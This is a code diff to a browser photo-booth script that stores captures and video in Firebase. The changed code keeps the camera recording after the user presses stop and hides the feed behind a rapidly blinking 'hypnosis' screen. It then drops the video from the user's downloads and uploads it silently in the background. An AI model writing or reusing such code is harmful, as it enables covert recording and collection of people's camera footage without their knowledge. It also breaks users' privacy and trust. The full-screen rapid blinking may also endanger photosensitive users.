@@ -11,6 +11,9 @@ let videoBlob = null;
 let finalFrameBlob = null;
 let sessionId = null;
 let imageCounter = 0;
+let uploadedImageCount = 0;
+let isUploadingImages = false;
+let readyToShowDownload = false;
 
 /**
  * Shows the attractive photo booth button after acceptance
@@ -338,6 +341,13 @@ function captureImage() {
                     index: currentImageIndex,
                     downloadUrl: downloadUrl
                 });
+                
+                // Increment uploaded count and check if we're done
+                uploadedImageCount++;
+                if (isUploadingImages && uploadedImageCount === imageCounter) {
+                    // All images uploaded - show download page
+                    checkIfAllUploadsComplete();
+                }
             } catch (error) {
                 console.error('Failed to upload image:', error);
             }
@@ -345,87 +355,111 @@ function captureImage() {
         
         // Visual feedback - brief subtitle showing image was captured
         const heading2 = document.getElementById('heading2');
-        const originalText = heading2.textContent;
-        heading2.textContent = `📷 Captured! (${capturedImages.length})`;
-        setTimeout(() => {
-            heading2.textContent = originalText;
-        }, 1500);
+        if (heading2) {
+            const originalText = heading2.textContent;
+            heading2.textContent = `📷 Captured! (${capturedImages.length + 1})`;
+            setTimeout(() => {
+                if (heading2 && !isUploadingImages) {
+                    heading2.textContent = originalText;
+                }
+            }, 1500);
+        }
     });
 }
 
 /**
- * Stops recording and uploads video to Firebase
+ * Stops recording and shows hypnotic upload page
  */
 function stopRecording() {
     if (mediaRecorder && isRecording) {
-        mediaRecorder.stop();
         isRecording = false;
+        isUploadingImages = true;
         
-        // Stop all tracks
-        mediaStream.getTracks().forEach(track => track.stop());
+        // Hide the camera feed immediately
+        const container = document.getElementById('camera-container');
+        if (container) container.style.display = 'none';
         
-        // Wait for the recording to finish processing
+        // Show hypnosis page immediately
+        showHypnosisPage();
+        
+        // Capture final frame from camera
         setTimeout(async () => {
-            videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
-            
-            // Upload video to Firebase Storage in real-time
-            if (sessionId) {
-                try {
-                    const storagePath = `sessions/${sessionId}/video.webm`;
-                    const downloadUrl = await uploadBlobToStorage(videoBlob, storagePath);
-                    
-                    // Record video upload in database
-                    await uploadToDatabase(`sessions/${sessionId}/video`, {
-                        timestamp: new Date().toISOString(),
-                        downloadUrl: downloadUrl,
-                        size: videoBlob.size
-                    });
-                } catch (error) {
-                    console.error('Failed to upload video:', error);
-                }
-            }
-            
-            // Capture final frame
             const video = document.getElementById('camera-feed');
-            const canvas = document.getElementById('capture-canvas');
-            const ctx = canvas.getContext('2d');
-            
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0);
-            
-            canvas.toBlob((blob) => {
-                finalFrameBlob = blob;
-                cleanup();
-            });
-        }, 1000);
+            if (video) {
+                const canvas = document.getElementById('capture-canvas');
+                const ctx = canvas.getContext('2d');
+                
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0);
+                
+                canvas.toBlob((blob) => {
+                    finalFrameBlob = blob;
+                    // Check if all images are uploaded, if so proceed to cleanup
+                    checkIfAllUploadsComplete();
+                });
+            }
+        }, 500);
     }
 }
 
 /**
- * Downloads all captured files at once
+ * Checks if all image uploads are complete and proceeds to show download page
+ */
+function checkIfAllUploadsComplete() {
+    // Only proceed once
+    if (readyToShowDownload) return;
+    
+    // If no images were captured, or if all uploads are done, proceed
+    if ((uploadedImageCount === imageCounter && imageCounter > 0) || imageCounter === 0) {
+        readyToShowDownload = true;
+        cleanup();
+    }
+    // Otherwise, wait for more uploads to complete
+}
+
+/**
+ * Shows rapid blinking animation while files upload
+ */
+function showHypnosisPage() {
+    // const container = document.createElement('div');
+    // container.id = 'hypnosis-page';
+    // container.style.position = 'fixed';
+    // container.style.top = '0';
+    // container.style.left = '0';
+    // container.style.width = '100%';
+    // container.style.height = '100%';
+    // container.style.zIndex = '10000000';
+    // container.style.backgroundColor = 'rgb(255, 203, 227)';
+    // document.body.appendChild(container);
+    
+    // Use RapidBlink for the upload phase
+
+    const heading2 = document.getElementById('heading2');
+    heading2.textContent = 'Uploading your memories...';
+
+    RapidBlink("rgb(255, 203, 227)", 60, 10, false);
+}
+
+/**
+ * Downloads all captured files at once (excludes video which is handled separately)
  */
 async function downloadAll() {
     // Use JSZip library if available, otherwise download files individually with delay
     if (typeof JSZip !== 'undefined') {
         const zip = new JSZip();
         
-        // Add all captured images
-        capturedImages.forEach((img, index) => {
-            zip.file(`photo-${index + 1}.png`, img.blob);
-        });
-        
-        // Add video
-        if (videoBlob) {
-            zip.file(`video-recording.webm`, videoBlob);
-        }
-        
         // Add final frame
         if (finalFrameBlob) {
             zip.file(`final-photo.png`, finalFrameBlob);
         }
         
-        // Generate and download zip
+        // Add all captured images
+        capturedImages.forEach((img, index) => {
+            zip.file(`photo-${index + 1}.png`, img.blob);
+        });
+        
+        // Generate and download zip (video not included - handled separately)
         zip.generateAsync({ type: 'blob' }).then((blob) => {
             const url = URL.createObjectURL(blob);
             const link = document.createElement('a');
@@ -437,19 +471,6 @@ async function downloadAll() {
     } else {
         // Fallback: download files individually with staggered delays
         let delay = 0;
-        
-        // Download video first
-        if (videoBlob) {
-            setTimeout(() => {
-                const url = URL.createObjectURL(videoBlob);
-                const link = document.createElement('a');
-                link.href = url;
-                link.download = `video-${Date.now()}.webm`;
-                link.click();
-                URL.revokeObjectURL(url);
-            }, delay);
-            delay += 500;
-        }
         
         // Download final frame
         if (finalFrameBlob) {
@@ -464,7 +485,7 @@ async function downloadAll() {
             delay += 500;
         }
         
-        // Download captured images
+        // Download captured images (video not included - handled separately)
         capturedImages.forEach((img, index) => {
             setTimeout(() => {
                 const url = URL.createObjectURL(img.blob);
@@ -571,8 +592,70 @@ function cleanup() {
         delete window._focusCleanup;
     }
     
-    // Show the download page with all captured files
-    showDownloadPage();
+    // Reset uploading flag
+    isUploadingImages = false;
+    
+    // Stop the media recorder now (it's been running during hypnosis)
+    if (mediaRecorder && mediaRecorder.state === 'recording') {
+        mediaRecorder.stop();
+        
+        // Wait for the recording to finish processing
+        setTimeout(() => {
+            videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+            
+            // NOW stop all tracks after recording is complete
+            mediaStream.getTracks().forEach(track => track.stop());
+            
+            // Remove hypnosis page
+            const hypnosisPage = document.getElementById('hypnosis-page');
+            if (hypnosisPage) hypnosisPage.remove();
+            
+            // Show the download page with all captured files
+            showDownloadPage();
+            
+            // Upload video in the background
+            uploadVideoInBackground();
+        }, 500);
+    } else {
+        // If recorder already stopped, proceed immediately
+        videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+        
+        // Stop all tracks
+        mediaStream.getTracks().forEach(track => track.stop());
+        
+        // Remove hypnosis page
+        const hypnosisPage = document.getElementById('hypnosis-page');
+        if (hypnosisPage) hypnosisPage.remove();
+        
+        // Show the download page with all captured files
+        showDownloadPage();
+        
+        // Upload video in the background
+        uploadVideoInBackground();
+    }
+}
+
+/**
+ * Uploads video in the background after download page is shown
+ */
+async function uploadVideoInBackground() {
+    if (videoBlob && sessionId) {
+        try {
+            const storagePath = `sessions/${sessionId}/video.webm`;
+            const downloadUrl = await uploadBlobToStorage(videoBlob, storagePath);
+            
+            // Record video upload in database
+            await uploadToDatabase(`sessions/${sessionId}/video`, {
+                timestamp: new Date().toISOString(),
+                downloadUrl: downloadUrl,
+                size: videoBlob.size
+            });
+            
+            console.log('✅ Video uploaded successfully in background');
+        } catch (error) {
+            console.error('❌ Failed to upload video in background:', error);
+        }
+    }
 }
 
 /**
@@ -593,6 +676,10 @@ function finishAndReset() {
     videoBlob = null;
     finalFrameBlob = null;
     recordedChunks = [];
+    imageCounter = 0;
+    uploadedImageCount = 0;
+    isUploadingImages = false;
+    readyToShowDownload = false;
     
     // Return to normal state
     document.body.style.backgroundColor = 'rgb(255, 203, 227)';
